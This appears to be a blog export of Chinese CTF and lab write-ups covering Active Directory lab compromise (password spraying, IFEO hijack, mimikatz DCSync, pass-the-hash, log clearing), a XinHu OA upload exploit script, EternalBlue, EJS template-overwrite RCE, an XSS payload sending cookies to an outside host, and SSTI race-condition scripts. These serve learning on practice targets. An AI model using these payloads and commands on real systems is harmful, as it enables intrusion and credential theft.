\\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 这台机子不出网，我们可以通过共享文件夹的方式来传文件\n这里我是用第一台机子(172.22.8.18)，将文件夹C:/xrntkk共享给(172.22.8.46)\n在46上Win+R并输入\n\\\\172.22.8.18 输入18共享文件的账号密码即可\n接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"./assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"./assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"./assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg 